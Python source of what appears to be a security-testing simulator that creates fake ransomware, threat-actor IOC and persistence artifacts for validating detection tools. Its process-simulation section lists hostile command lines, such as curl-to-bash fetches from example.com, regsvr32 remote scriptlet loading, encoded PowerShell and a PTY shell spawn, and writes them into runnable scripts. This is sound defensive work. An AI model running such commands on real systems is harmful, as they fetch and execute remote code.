#!/usr/bin/env python3
"""
.------..------..------..------..------..------.
|S.--. ||A.--. ||F.--. ||E.--. ||>.--. ||>.--. |
| :/\: || (\/) || :(): || (\/) || (\/) || (\/) |
| :\/: || :\/: || ()() || :\/: || :\/: || :\/: |
| '--'S|| '--'A|| '--'F|| '--'E|| '--'>|| '--'>|
`------'`------'`------'`------'`------'`------'

Simulated Adversary File Events (SAFE) - A Security Testing Framework
[TrustedSec Edition]

Purpose:
This tool helps security teams validate their detection capabilities by simulating
common threat actor behaviors in a safe, controlled manner.

Core Features:
1. File-Based Simulations
   - Ransomware behavior (encrypted files, ransom notes)
   - Suspicious file creation and manipulation
   - Common malware patterns

2. Process Activity Simulation
   - Suspicious process creation
   - Command-line patterns
   - Process injection indicators

3. Threat Actor Profiles
   - Known group TTPs (LockBit, FIN7, APT29, etc.)
   - MITRE ATT&CK mapped behaviors
   - Custom IOC generation

4. OS-Specific Persistence
   - Windows: Registry, Tasks, Services
   - macOS: Launch Agents, Dylib
   - Linux: Systemd, Cron, Bash

Testing Workflow:
Step 1: Basic File Simulation
   - Choose extension type (option 1)
   - Set file count if needed (option 2)
   - Run simulation (option 8)
   - Verify your security tools detect the activity

Step 2: Threat Actor Simulation
   - Select actor profile (option 4)
   - Review available IOCs (option 5)
   - Run simulation (option 8)
   - Check detection of actor-specific TTPs

Step 3: Persistence Testing
   - Create persistence artifacts (option 6)
   - Review persistence report (option 7)
   - Validate detection of persistence mechanisms

Step 4: Process Activity [Coming Soon]
   - Simulate suspicious processes
   - Test command-line monitoring
   - Validate process relationship detection

Security Tool Testing Targets:
- EDR/XDR Solutions
- SIEM Platforms
- Antivirus Products
- File Integrity Monitoring
- Behavioral Analytics
- Custom Detection Rules

[No systems are harmed in the making of these simulations]
"""

import os
import sys
import time
import base64
import random
import string
import hashlib
import platform
from pathlib import Path
from datetime import datetime

# Curated extension options (benign)
EXTENSIONS = [
    ".locked", ".encrypted", ".crypt", ".crypto",
    ".cerber", ".zepto", ".odin", ".thor", ".arena",
    ".vvv", ".ecc", ".zzz", ".xyz", ".vault",
    ".LOCKY", ".chaos", ".v1cesO0ciety"
]

# Common IOC patterns for simulation
THREAT_PROFILES = {
    "fin7": {
        "name": "FIN7",
        "description": "Sophisticated financial threat actor known for targeting POS systems and financial data",
        "file_patterns": [
            "msupdate_ssl.exe",
            "error_report.pdf.lnk",
            "menu_prices.xls.js",
            "capt001.cmd",
            "wmstat32.dll",
            "libgcc_downloader.ps1"
        ],
        "network_iocs": [
            "microsoft-update-ssl.com",
            "cdn-download.cloud",
            "error-report.net",
            "45.77.xxx.yyy",
            "185.159.xxx.yyy"
        ],
        "registry_keys": [
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate",
            r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache",
            r"HKCU\Software\Microsoft\Office\16.0\Common\Identity"
        ],
        "mutexes": [
            "Global\\FIN7_Command",
            "Global\\POS_Scraper",
            "Global\\CardReader"
        ]
    },
    "apt29": {
        "name": "APT29 (Cozy Bear)",
        "description": "Sophisticated state-sponsored actor known for stealth and custom malware",
        "file_patterns": [
            "cozyduke.dll",
            "CosmicDuke.exe",
            "PasswordFilter.dll",
            "dns_updater.ps1",
            "miniDuke.exe",
            "secd.bin"
        ],
        "network_iocs": [
            "google-up.com",
            "twitter-cdn.com",
            "microsoft-update.org",
            "162.12.xxx.yyy",
            "185.86.xxx.yyy"
        ],
        "registry_keys": [
            r"HKLM\SYSTEM\CurrentControlSet\Services\WebClient\Parameters",
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced",
            r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\GPExtensions"
        ],
        "mutexes": [
            "Global\\WellKnown_Sid",
            "Global\\SeDebugPrivilege",
            "Global\\DnsCache"
        ]
    },
    "lockbit": {
        "name": "LockBit Ransomware",
        "description": "LockBit ransomware group TTPs and IOCs",
        "file_patterns": [
            "LOCKBIT-DECRYPTION-README.txt",
            "HLJkNskOq.lockbit",
            "lockbit_recovery.exe",
            "lock64.dll",
            ".lockbit_recovery.txt"
        ],
        "network_iocs": [
            "lockbitapt6vx57t3eeqjofwgcglmutr3a35nygvokja5uuccip4ykyd.onion",
            "lockbitfile2tcudkcqqt2ve6btssyvqwlizbpv5vz337lslmhff2uad.onion",
            "api.lockbit.su",
            "cdn.lockbit.su"
        ],
        "registry_keys": [
            r"HKCU\Software\LockBit\Config",
            r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\*",
            r"HKLM\SYSTEM\CurrentControlSet\Services\LockBitService",
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\LockBitStart"
        ],
        "mutexes": [
            "Global\\LockBitCrypt",
            "Global\\LockBitCommand",
            "Global\\LockBitRecover"
        ]
    },
    "scattered_spider": {
        "name": "Scattered Spider",
        "description": "Scattered Spider/UNC3944 TTPs and IOCs",
        "file_patterns": [
            "lsa_dump.bin",
            "mimikatz.log",
            "ProcDump64.exe",
            "ADRecon.py",
            "SharpHound.exe",
            "ntds.dit",
            "veeam_backup.exe"
        ],
        "network_iocs": [
            "scattered-c2.dynamic-dns.net",
            "okta-service.com",
            "duo-push.net",
            "azure-mgmt-service.com",
            "cloudflare-cdn.net"
        ],
        "registry_keys": [
            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA",
            r"HKLM\SYSTEM\CurrentControlSet\Services\TermService\Parameters",
            r"HKCU\Software\Microsoft\Terminal Server Client\Servers",
            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers"
        ],
        "mutexes": [
            "Global\\ScatteredSpider_Session",
            "Global\\LSASS_Dump_Progress",
            "Global\\VeeamBackupSession"
        ]
    },
    "generic_ransomware": {
        "name": "Generic Ransomware",
        "description": "Common ransomware behavior patterns",
        "file_patterns": [
            "README.txt", "DECRYPT.txt", "HOW_TO_RECOVER.html",
            "restore.txt", "YOUR_FILES.html"
        ],
        "network_iocs": [
            "ransom-payment.bit",
            "decrypt-service.onion",
            "195.123.xxx.yyy",
            "btc-wallet.payment.net"
        ],
        "registry_keys": [
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Ransom",
            r"HKLM\SOFTWARE\Microsoft\Cryptography\Ransom"
        ],
        "mutexes": [
            "Global\\RansomEncryption",
            "Global\\PaymentPending"
        ]
    },
    "apt_simulation": {
        "name": "APT Simulation",
        "description": "Advanced Persistent Threat patterns",
        "file_patterns": [
            "system32.dll.exe",
            "svchost_backdoor.exe",
            "update_service.exe"
        ],
        "network_iocs": [
            "command-control.dynamic-dns.org",
            "data-exfil.cloud",
            "45.67.xxx.yyy",
            "91.234.xxx.yyy"
        ],
        "registry_keys": [
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\UpdateService",
            r"HKLM\SYSTEM\CurrentControlSet\Services\RemoteAccess"
        ],
        "mutexes": [
            "Global\\APT_Command_Channel",
            "Global\\DataExfiltration"
        ]
    }
}

class IOCSimulator:
    def __init__(self, base_dir):
        self.base_dir = Path(base_dir)
        self.selected_profile = None
    
    def select_profile(self):
        print("\nAvailable Threat Profiles:")
        for i, (key, profile) in enumerate(THREAT_PROFILES.items(), start=1):
            print(f"{i:2d}) {profile['name']}")
            print(f"    {profile['description']}")
        
        sel = input("\nSelect a profile number: ").strip()
        try:
            n = int(sel)
            if 1 <= n <= len(THREAT_PROFILES):
                self.selected_profile = list(THREAT_PROFILES.keys())[n-1]
                print(f"Selected profile: {THREAT_PROFILES[self.selected_profile]['name']}")
                return True
        except ValueError:
            pass
        print("Invalid selection.")
        return False

    def create_file_iocs(self):
        """Create benign files matching common IOC patterns"""
        if not self.selected_profile:
            return
        
        profile = THREAT_PROFILES[self.selected_profile]
        created = []
        
        for pattern in profile['file_patterns']:
            path = self.base_dir / pattern
            with open(path, "w", encoding="utf-8") as f:
                f.write(f"--- Simulated IOC File ---\n")
                f.write(f"Profile: {profile['name']}\n")
                f.write(f"Pattern: {pattern}\n")
                f.write(f"Created: {datetime.now().isoformat()}\n")
                # Create a unique hash for this file
                f.write(fake_ciphertext(100, 200))
            created.append(pattern)
        
        return created

    def get_mitre_info(self, profile_name):
        """Return MITRE ATT&CK information for specific threat actors"""
        mitre_info = {
            "fin7": {
                "techniques": {
                    "T1204.002": {
                        "name": "User Execution: Malicious File",
                        "artifacts": ["weaponized Office documents", "malicious .lnk files"]
                    },
                    "T1055": {
                        "name": "Process Injection",
                        "artifacts": ["injected DLLs", "memory-resident malware"]
                    },
                    "T1543.003": {
                        "name": "Create or Modify System Process: Windows Service",
                        "artifacts": ["suspicious services", "service registry entries"]
                    },
                    "T1027": {
                        "name": "Obfuscated Files or Information",
                        "artifacts": ["encoded PowerShell", "obfuscated JavaScript"]
                    },
                    "T1056.001": {
                        "name": "Input Capture: Keylogging",
                        "artifacts": ["keystroke logs", "memory-scraped POS data"]
                    }
                },
                "tools": {
                    "S0118": "Carbanak",
                    "S0457": "Griffon",
                    "S0242": "Astra",
                    "S0568": "SQLRat",
                    "S0500": "BOOSTWRITE"
                }
            },
            "apt29": {
                "techniques": {
                    "T1195": {
                        "name": "Supply Chain Compromise",
                        "artifacts": ["modified system DLLs", "compromised updates"]
                    },
                    "T1573": {
                        "name": "Encrypted Channel",
                        "artifacts": ["encrypted C2 traffic", "custom SSL certificates"]
                    },
                    "T1505.002": {
                        "name": "Server Software Component: Transport Agent",
                        "artifacts": ["Exchange transport agents", "mail server modifications"]
                    },
                    "T1053.005": {
                        "name": "Scheduled Task/Job: Scheduled Task",
                        "artifacts": ["WMI persistence", "scheduled tasks"]
                    },
                    "T1134": {
                        "name": "Access Token Manipulation",
                        "artifacts": ["token impersonation", "elevated processes"]
                    },
                    "T1070.001": {
                        "name": "Indicator Removal: Clear Windows Event Logs",
                        "artifacts": ["cleared logs", "modified audit policies"]
                    }
                },
                "tools": {
                    "S0354": "HAMMERTOSS",
                    "S0416": "WellMess",
                    "S0446": "WellMail",
                    "S0363": "Empire",
                    "S0552": "AdFind"
                }
            },
            "lockbit": {
                "techniques": {
                    "T1486": {
                        "name": "Data Encrypted for Impact",
                        "artifacts": ["encrypted files", "ransom notes"]
                    },
                    "T1490": {
                        "name": "Inhibit System Recovery",
                        "artifacts": ["vssadmin delete shadows", "wmic shadowcopy delete"]
                    },
                    "T1489": {
                        "name": "Service Stop",
                        "artifacts": ["stopped backup services", "disabled security services"]
                    },
                    "T1112": {
                        "name": "Modify Registry",
                        "artifacts": ["persistence keys", "disabled security features"]
                    },
                    "T1083": {
                        "name": "File and Directory Discovery",
                        "artifacts": ["enumerated shares", "file listings"]
                    },
                    "T1566": {
                        "name": "Phishing",
                        "artifacts": ["malicious documents", "phishing emails"]
                    },
                    "T1190": {
                        "name": "Exploit Public-Facing Application",
                        "artifacts": ["web shell uploads", "RCE attempts"]
                    }
                },
                "tools": {
                    "S0363": "Empire",
                    "S0154": "Cobalt Strike",
                    "S0029": "PsExec",
                    "S0002": "Mimikatz"
                }
            },
            "scattered_spider": {
                "techniques": {
                    "T1078": {
                        "name": "Valid Accounts",
                        "artifacts": ["unauthorized admin accounts", "hijacked sessions"]
                    },
                    "T1187": {
                        "name": "Forced Authentication",
                        "artifacts": ["NTLM hashes", "credential harvesting"]
                    },
                    "T1557": {
                        "name": "MFA Interception",
                        "artifacts": ["intercepted tokens", "bypassed 2FA"]
                    },
                    "T1552": {
                        "name": "Unsecured Credentials",
                        "artifacts": ["found API keys", "exposed credentials"]
                    },
                    "T1003": {
                        "name": "OS Credential Dumping",
                        "artifacts": ["LSASS dumps", "NTDS.dit extracts"]
                    },
                    "T1098": {
                        "name": "Account Manipulation",
                        "artifacts": ["modified permissions", "added privileges"]
                    },
                    "T1133": {
                        "name": "External Remote Services",
                        "artifacts": ["VPN access", "RDP connections"]
                    }
                },
                "tools": {
                    "S0519": "Veeam",
                    "S0002": "Mimikatz",
                    "S0521": "ProcDump",
                    "S0125": "SharpHound",
                    "S0552": "ADRecon",
                    "S0113": "Social Engineering Toolkit"
                }
            }
        }
        return mitre_info.get(profile_name, {"techniques": {}, "tools": {}})

    def generate_ioc_report(self):
        """Generate a report of all simulated IOCs"""
        if not self.selected_profile:
            return ""
        
        profile = THREAT_PROFILES[self.selected_profile]
        mitre_info = self.get_mitre_info(self.selected_profile)
        
        lines = [
            "=== Simulated IOC Report ===",
            f"Profile: {profile['name']}",
            f"Description: {profile['description']}",
            f"Timestamp: {datetime.now().isoformat()}",
            f"Target Directory: {self.base_dir}",
            "",
            "=== MITRE ATT&CK Techniques ===",
        ]

        # Add techniques with their artifacts
        for tid, tech in mitre_info["techniques"].items():
            lines.extend([
                f"  {tid}: {tech['name']}",
                "    Expected Artifacts:",
                *[f"    - {artifact}" for artifact in tech["artifacts"]],
                ""
            ])

        # Add tools with their MITRE IDs
        tool_lines = ["=== Known Tools (with MITRE Software IDs) ==="]
        tool_lines.extend([f"  {sid}: {tool}" for sid, tool in mitre_info["tools"].items()])
        tool_lines.extend(["", "=== File Artifacts ==="])
        lines.extend(tool_lines)
        
        for pattern in profile['file_patterns']:
            path = self.base_dir / pattern
            if path.exists():
                hash_md5 = hashlib.md5()
                with open(path, "rb") as f:
                    for chunk in iter(lambda: f.read(4096), b""):
                        hash_md5.update(chunk)
                lines.append(f"  - {pattern}")
                lines.append(f"    MD5: {hash_md5.hexdigest()}")
        
        lines.extend([
            "",
            "Network IOCs:",
            *[f"  - {ioc}" for ioc in profile['network_iocs']],
            "",
            "Registry Keys (Windows):",
            *[f"  - {key}" for key in profile['registry_keys']],
            "",
            "Mutexes:",
            *[f"  - {mutex}" for mutex in profile['mutexes']],
            "",
            "System Information:",
            f"  OS: {platform.system()} {platform.release()}",
            f"  Version: {platform.version()}",
            f"  Architecture: {platform.machine()}",
            f"  Node: {platform.node()}",
            "",
            "OS-Specific Persistence Locations:",
            *[f"  - {k}: {v}" for k, v in self.system_info["common_paths"].items()],
            "",
            "Available Simulation Features:",
            *[f"  - {feature}" for feature in self.system_info["features"]]
        ])
        
        return "\n".join(lines)

def get_system_info():
    """Get detailed system information and common paths based on OS"""
    os_type = platform.system().lower()
    os_info = {
        "type": os_type,
        "release": platform.release(),
        "version": platform.version(),
        "machine": platform.machine(),
        "hostname": platform.node(),
        "common_paths": {},
        "features": []
    }

    # OS-specific paths and features
    if os_type == "windows":
        os_info["common_paths"].update({
            "system32": r"C:\Windows\System32",
            "program_files": r"C:\Program Files",
            "appdata": os.getenv("APPDATA", r"C:\Users\Default\AppData\Roaming"),
            "temp": os.getenv("TEMP", r"C:\Windows\Temp"),
            "startup": os.path.join(os.getenv("APPDATA", ""), r"Microsoft\Windows\Start Menu\Programs\Startup")
        })
        os_info["features"].extend([
            "registry_simulation",
            "service_simulation",
            "startup_persistence",
            "scheduled_tasks"
        ])
    elif os_type == "darwin":  # macOS
        os_info["common_paths"].update({
            "applications": "/Applications",
            "library": "/Library",
            "launch_agents": "~/Library/LaunchAgents",
            "system_launch_daemons": "/Library/LaunchDaemons",
            "temp": "/tmp"
        })
        os_info["features"].extend([
            "launch_agent_simulation",
            "kernel_extension_simulation",
            "dylib_hijacking"
        ])
    elif os_type == "linux":
        os_info["common_paths"].update({
            "etc": "/etc",
            "opt": "/opt",
            "tmp": "/tmp",
            "systemd": "/etc/systemd/system",
            "cron": "/etc/cron.d"
        })
        os_info["features"].extend([
            "systemd_service_simulation",
            "cron_persistence",
            "bash_rc_simulation"
        ])
    
    return os_info

def get_desktop():
    """Cross-platform best effort for Desktop, with OS-specific fallbacks"""
    os_type = platform.system().lower()
    home = Path.home()
    
    # Try standard Desktop location first
    desktop = home / "Desktop"
    if desktop.exists() and desktop.is_dir():
        return desktop
    
    # OS-specific fallbacks
    if os_type == "windows":
        # Try Windows-specific Desktop location
        desktop = Path(os.path.expandvars("%USERPROFILE%\\Desktop"))
        if desktop.exists() and desktop.is_dir():
            return desktop
    elif os_type == "linux":
        # Try XDG user dirs
        try:
            with open(home / ".config/user-dirs.dirs", "r") as f:
                for line in f:
                    if "XDG_DESKTOP_DIR" in line:
                        desktop_path = line.split("=")[1].strip().strip('"')
                        desktop_path = os.path.expandvars(desktop_path)
                        desktop = Path(desktop_path)
                        if desktop.exists() and desktop.is_dir():
                            return desktop
        except FileNotFoundError:
            pass
    
    # Final fallback to home directory
    return home

def random_filename(length=10):
    stem = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    return stem

def fake_ciphertext(min_bytes=800, max_bytes=2000):
    # Produce random bytes and base64 them so it *looks* encoded
    raw = os.urandom(random.randint(min_bytes, max_bytes))
    return base64.b64encode(raw).decode("ascii")

class PersistenceSimulator:
    def __init__(self, base_dir, system_info):
        self.base_dir = Path(base_dir)
        self.system_info = system_info
        self.created_artifacts = []

    def simulate_windows_persistence(self):
        """Simulate Windows persistence mechanisms"""
        if self.system_info["type"] != "windows":
            return []

        artifacts = []
        
        # Simulate registry run keys
        reg_run_content = """Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]
"UpdateService"="C:\\Windows\\System32\\WindowsUpdate.exe"
"OfficeHelper"="C:\\Program Files\\Microsoft Office\\Office16\\OfficeHelper.exe"

[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]
"SecurityService"="C:\\Program Files\\Security Suite\\SecService.exe"
"""
        reg_file = self.base_dir / "persistence_keys.reg"
        with open(reg_file, "w") as f:
            f.write(reg_run_content)
        artifacts.append(("registry", str(reg_file)))

        # Simulate scheduled task
        task_xml = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Update Helper</Description>
    <URI>\\Microsoft\\Windows\\UpdateHelper</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>C:\\Windows\\System32\\WindowsUpdate.exe</Command>
    </Exec>
  </Actions>
</Task>"""
        task_file = self.base_dir / "update_helper.xml"
        with open(task_file, "w") as f:
            f.write(task_xml)
        artifacts.append(("scheduled_task", str(task_file)))

        # Simulate startup folder shortcut
        shortcut_vbs = """Set WScript = CreateObject("WScript.Shell")
Set link = WScript.CreateShortcut("startup_helper.lnk")
link.TargetPath = "C:\\Windows\\System32\\WindowsUpdate.exe"
link.WorkingDirectory = "C:\\Windows\\System32"
link.Description = "Windows Update Helper"
link.Save"""
        vbs_file = self.base_dir / "create_shortcut.vbs"
        with open(vbs_file, "w") as f:
            f.write(shortcut_vbs)
        artifacts.append(("startup_script", str(vbs_file)))

        return artifacts

    def simulate_macos_persistence(self):
        """Simulate macOS persistence mechanisms"""
        if self.system_info["type"] != "darwin":
            return []

        artifacts = []

        # Simulate launch agent
        launch_agent = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update.helper</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/UpdateHelper.app/Contents/MacOS/UpdateHelper</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
        agent_file = self.base_dir / "com.apple.update.helper.plist"
        with open(agent_file, "w") as f:
            f.write(launch_agent)
        artifacts.append(("launch_agent", str(agent_file)))

        # Simulate dylib hijacking
        dylib_source = """#include <stdio.h>
#include <stdlib.h>

__attribute__((constructor))
static void initializer(void) {
    // Simulated malicious code would run here
    printf("Library loaded\\n");
}"""
        dylib_file = self.base_dir / "libsystem_override.c"
        with open(dylib_file, "w") as f:
            f.write(dylib_source)
        artifacts.append(("dylib_hijack", str(dylib_file)))

        return artifacts

    def simulate_linux_persistence(self):
        """Simulate Linux persistence mechanisms"""
        if self.system_info["type"] != "linux":
            return []

        artifacts = []

        # Simulate systemd service
        service_content = """[Unit]
Description=Update Helper Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/local/bin/update_helper
Restart=always

[Install]
WantedBy=multi-user.target"""
        service_file = self.base_dir / "update-helper.service"
        with open(service_file, "w") as f:
            f.write(service_content)
        artifacts.append(("systemd_service", str(service_file)))

        # Simulate cron job
        cron_content = """# Update helper runs every 30 minutes
*/30 * * * * root /usr/local/bin/update_helper >/dev/null 2>&1

# Daily system maintenance
@daily root /usr/local/bin/system_maintenance.sh"""
        cron_file = self.base_dir / "update-helper.cron"
        with open(cron_file, "w") as f:
            f.write(cron_content)
        artifacts.append(("cron_job", str(cron_file)))

        # Simulate bash profile modification
        bashrc_content = """# Added by system update
export PATH="/usr/local/bin:$PATH"
alias ls='ls --color=auto'
# Persistence mechanism
nohup /usr/local/bin/update_helper >/dev/null 2>&1 &"""
        bashrc_file = self.base_dir / ".bashrc_mod"
        with open(bashrc_file, "w") as f:
            f.write(bashrc_content)
        artifacts.append(("bash_profile", str(bashrc_file)))

        return artifacts

    def simulate_persistence(self):
        """Create persistence simulation artifacts based on OS"""
        if self.system_info["type"] == "windows":
            self.created_artifacts = self.simulate_windows_persistence()
        elif self.system_info["type"] == "darwin":
            self.created_artifacts = self.simulate_macos_persistence()
        elif self.system_info["type"] == "linux":
            self.created_artifacts = self.simulate_linux_persistence()
        
        return self.created_artifacts

    def generate_persistence_report(self):
        """Generate a report of created persistence mechanisms"""
        if not self.created_artifacts:
            return "No persistence artifacts have been created yet."

        lines = [
            "=== Persistence Simulation Report ===",
            f"Operating System: {'macOS' if self.system_info['type'] == 'darwin' else self.system_info['type'].title()}",
            f"Target Directory: {self.base_dir}",
            "",
            "Created Artifacts:",
        ]

        for artifact_type, path in self.created_artifacts:
            lines.extend([
                f"  {artifact_type.replace('_', ' ').title()}:",
                f"    {path}",
                ""
            ])

        lines.extend([
            "Note: These are benign simulation files that demonstrate common persistence techniques.",
            "They can be used to test detection and monitoring systems.",
            "",
            "Recommended Detection Methods:",
            "- Monitor file creation in system directories",
            "- Track autorun locations and startup items",
            "- Watch for suspicious service creation",
            "- Monitor scheduled task creation",
            "- Implement baseline deviation alerts"
        ])

        return "\n".join(lines)

class ProcessSimulator:
    def __init__(self, base_dir, system_info):
        self.base_dir = Path(base_dir)
        self.system_info = system_info
        self.created_artifacts = []
        
        # Common process patterns by OS
        self.process_patterns = {
            "windows": [
                {
                    "name": "cmd.exe",
                    "args": "/c powershell.exe -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
                    "parent": "explorer.exe",
                    "technique": "T1059.001",
                    "description": "PowerShell encoded command execution",
                    "detection": "Monitor for base64 encoded PowerShell commands"
                },
                {
                    "name": "rundll32.exe",
                    "args": "C:\\Windows\\Temp\\update.dll,StartW",
                    "parent": "services.exe",
                    "technique": "T1218.011",
                    "description": "Suspicious DLL loading via rundll32",
                    "detection": "Monitor rundll32.exe with suspicious DLL paths"
                },
                {
                    "name": "regsvr32.exe",
                    "args": "/s /n /u /i:http://example.com/file.sct scrobj.dll",
                    "parent": "cmd.exe",
                    "technique": "T1218.010",
                    "description": "Regsvr32 remote script execution",
                    "detection": "Monitor regsvr32.exe with network indicators"
                }
            ],
            "darwin": [  # macOS
                {
                    "name": "osascript",
                    "args": "-e 'do shell script \"curl -s http://example.com/script.sh | bash\"'",
                    "parent": "Terminal",
                    "technique": "T1059.002",
                    "description": "AppleScript remote script execution",
                    "detection": "Monitor osascript execution with network commands"
                },
                {
                    "name": "python3",
                    "args": "-c 'import os; os.system(\"echo YXXX | base64 -d | bash\")'",
                    "parent": "bash",
                    "technique": "T1059.006",
                    "description": "Python command execution with encoded bash",
                    "detection": "Monitor Python process with encoded strings"
                }
            ],
            "linux": [
                {
                    "name": "bash",
                    "args": "-c '$(curl -s http://example.com/script.sh)'",
                    "parent": "sshd",
                    "technique": "T1059.004",
                    "description": "Bash execution of remote script",
                    "detection": "Monitor shell execution with curl/wget"
                },
                {
                    "name": "python3",
                    "args": "-c 'import pty; pty.spawn(\"/bin/bash\")'",
                    "parent": "apache2",
                    "technique": "T1059.006",
                    "description": "Python PTY shell spawn",
                    "detection": "Monitor Python spawning shell processes"
                }
            ]
        }

    def create_process_artifacts(self):
        """Create process simulation artifacts based on OS"""
        os_type = self.system_info["type"]
        if os_type not in self.process_patterns:
            return []

        artifacts = []
        processes = self.process_patterns[os_type]

        # Create a script that would generate these process patterns
        if os_type == "windows":
            script_content = "@echo off\nREM Process Simulation Script\n\n"
            for proc in processes:
                script_content += f"REM {proc['description']}\n"
                script_content += f"REM MITRE: {proc['technique']}\n"
                script_content += f"REM Detection: {proc['detection']}\n"
                script_content += f"start /b {proc['name']} {proc['args']}\n\n"
            
            script_file = self.base_dir / "simulate_processes.bat"
            artifacts.append(("batch_script", str(script_file)))

        else:  # macOS and Linux
            script_content = "#!/bin/bash\n# Process Simulation Script\n\n"
            for proc in processes:
                script_content += f"# {proc['description']}\n"
                script_content += f"# MITRE: {proc['technique']}\n"
                script_content += f"# Detection: {proc['detection']}\n"
                script_content += f"{proc['name']} {proc['args']} &\n\n"
            
            script_file = self.base_dir / "simulate_processes.sh"
            artifacts.append(("shell_script", str(script_file)))

        # Create the script file
        with open(script_file, "w") as f:
            f.write(script_content)

        # Create a documentation file explaining the processes
        doc_content = "=== Process Simulation Documentation ===\n\n"
        doc_content += f"Operating System: {os_type.upper()}\n\n"
        
        for proc in processes:
            doc_content += f"Process: {proc['name']}\n"
            doc_content += f"Arguments: {proc['args']}\n"
            doc_content += f"Parent Process: {proc['parent']}\n"
            doc_content += f"MITRE Technique: {proc['technique']}\n"
            doc_content += f"Description: {proc['description']}\n"
            doc_content += f"Detection Guidance: {proc['detection']}\n\n"

        doc_file = self.base_dir / "process_simulation.txt"
        with open(doc_file, "w") as f:
            f.write(doc_content)
        artifacts.append(("documentation", str(doc_file)))

        self.created_artifacts = artifacts
        return artifacts

    def generate_process_report(self):
        """Generate a report of simulated process artifacts"""
        if not self.created_artifacts:
            return "No process artifacts have been created yet."

        lines = [
            "=== Process Simulation Report ===",
            f"Operating System: {'macOS' if self.system_info['type'] == 'darwin' else self.system_info['type'].title()}",
            f"Target Directory: {self.base_dir}",
            "",
            "Created Artifacts:",
        ]

        for artifact_type, path in self.created_artifacts:
            lines.extend([
                f"  {artifact_type.replace('_', ' ').title()}:",
                f"    {path}",
                ""
            ])

        lines.extend([
            "Available Process Patterns:",
            "-------------------"
        ])

        os_type = self.system_info["type"]
        if os_type in self.process_patterns:
            for proc in self.process_patterns[os_type]:
                lines.extend([
                    f"\nProcess: {proc['name']}",
                    f"MITRE: {proc['technique']}",
                    f"Description: {proc['description']}",
                    f"Detection: {proc['detection']}",
                    "-------------------"
                ])

        return "\n".join(lines)

def make_note_text(sim_folder, ext_choice, file_count):
    lines = [
        "### READ_ME_NOW.txt (Simulation Note) ###",
        "",
        "This is a SAFE simulation. No real files were encrypted.",
        f"Simulation folder: {sim_folder}",
        f"Selected extension: {ext_choice}",
        f"Generated files  : {file_count}",
        "",
        "If this were real ransomware, you would see:",
        "- Unusual file extensions applied to many files",
        "- A ransom note with payment/contact instructions",
        "- System/process/network indicators",
        "",
        "Use this folder to validate EDR/SIEM detections:",
        "- File creation bursts, extension anomalies",
        "- Ransom note presence, suspicious process behavior",
        "- Correlate with test user/session/host",
        "",
        "Stay safe. 💚"
    ]
    return "\n".join(lines)

class Simulator:
    def __init__(self):
        self.ext_choice = None
        self.file_count = 50
        self.write_note = True
        self.last_output_dir = None
        self.ioc_simulator = None
        self.system_info = get_system_info()
        self.persistence_simulator = None
        self.process_simulator = None
    def menu(self):
        # Gibson Green ANSI (approx 46 in 256-color table)
        G = "\033[38;5;46m"
        R = "\033[0m"  # reset

        banner = r"""

             .--------.
            / .------. \
           / /        \ \
           | |        | |
          _| |________| |_
        .' |_|        |_| '.
        '._____ ____ _____.'
        |     .'____'.     |
        '.__.'.'    '.'.__.'
        '.__  | SAFE |  __.'
        |   '.'.____.'.'   |
        '.____'.____.'____.'
        '.________________.' - trustedsec

        S I M U L A T E D   A T T A C K
                    F I L E   E N C R Y P T I O N   
         """
        while True:
            print("\033c", end="")  # clear screen for a fresh menu look
            print(G + banner + R)
            print("\nCurrent Status:")
            print("  Extension: {}".format(self.ext_choice if self.ext_choice else "Not selected"))
            print("  File Count: {}".format(self.file_count))
            print("  Ransom Note: {}".format("Enabled" if self.write_note else "Disabled"))
            print("  Threat Profile: {}".format(
                self.ioc_simulator.selected_profile.upper() if self.ioc_simulator and self.ioc_simulator.selected_profile 
                else "Not selected"
            ))
            print("  Output Directory: {}".format(self.last_output_dir if self.last_output_dir else "Not created"))

            if not self.ext_choice:
                print("\n[!] Required: Choose an extension first (option 1)")
            elif not self.last_output_dir:
                print("\n[>] Ready to run simulation (option 8)")
            
            print("\nStep 1 - File Encryption Setup:")
            print("1) Choose extension (required)")
            print("2) Set file count (current: {})".format(self.file_count))
            print("3) Toggle ransom note (current: {})".format("ON" if self.write_note else "OFF"))
            
            print("\nStep 2 - Threat Actor Simulation:")
            print("4) Select threat actor profile (optional)")
            print("5) Generate IOC report (preview available IOCs)")
            
            print("\nStep 3 - Persistence Simulation:")
            # OS icons: 🪟 Windows, 🍎 macOS,  Linux
            os_icons = {
                "windows": "🪟",  # window
                "darwin": "🍎",   # apple
                "linux": ""     # penguin
            }
            os_name = "macOS" if self.system_info['type'] == "darwin" else self.system_info['type'].upper()
            os_icon = os_icons.get(self.system_info['type'], "💻")
